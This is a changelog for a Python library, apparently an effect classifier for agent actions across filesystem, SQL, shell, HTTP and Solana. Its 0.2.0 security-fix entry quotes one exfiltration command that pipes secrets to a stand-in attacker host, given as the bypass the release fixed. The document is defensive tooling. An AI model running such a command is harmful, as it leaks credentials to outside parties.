# Changelog

## 0.2.0

Hardening release after a critical self-review. **Breaking.**

- **Breaking:** `CanonicalDelta.safe` → `CanonicalDelta.fully_classified` (and the
  JSON key). The old name implied a safety verdict it never made; the new name
  says what it is — "the effect was understood", not "the action is safe".
- **Security fix (shell):** the adapter no longer passes unmodelled constructs
  silently. Pipes, subshells, `$VAR`/`` `cmd` ``/`$( )`, globs, fd redirects,
  backgrounding, unbalanced quotes, and unknown commands now fail closed
  (`unknown`). Previously `cat secrets | curl evil.com` was reported classified
  with no effect.
- **Shell:** paths are normalized (`./prod.db` ≡ `prod.db`) so exact-match
  policies are not bypassed by `./`.
- **HTTP:** the URL path now counts toward egress bytes and the sensitive-marker
  scan (a secret in the path is no longer missed).
- **Solana:** an account is only parsed with the SPL token layout when a token
  program owns it (no more misreading arbitrary ≥165-byte accounts).
- **Docs:** added `SECURITY.md` and a "Security model & limitations" section. The
  README now states plainly that `filesystem`/`sql` **execute** the action (isolate
  untrusted input yourself), that `shell`/`http` interpret rather than simulate,
  and that the benchmark's 0% false-positive figure is corpus-specific.

## 0.1.0

First release.

- `CanonicalDelta` effect model (value moves, authority grants, data access,
  resource use) with fail-closed semantics.
- Adapters: `FilesystemAdapter` (shadow-copy diff with content hashing),
  `SqlAdapter` (savepoint + rollback), `ShellAdapter` (safe interpreter, never
  executes), `HttpAdapter` (egress classification, never sends), `SolanaAdapter`
  (RPC `simulateTransaction` + account diff; the one online adapter, injectable
  RPC, no `solana-py` dependency).
- `simdiff(action, adapter)` top-level API and a demo CLI with fail-closed exit
  codes.
- Adversarial benchmark (`python -m bench.run`) illustrating effect-deciding vs
  keyword/argument scanning. Numbers asserted in CI.
- Zero runtime dependencies, MIT licensed, typed (`py.typed`).
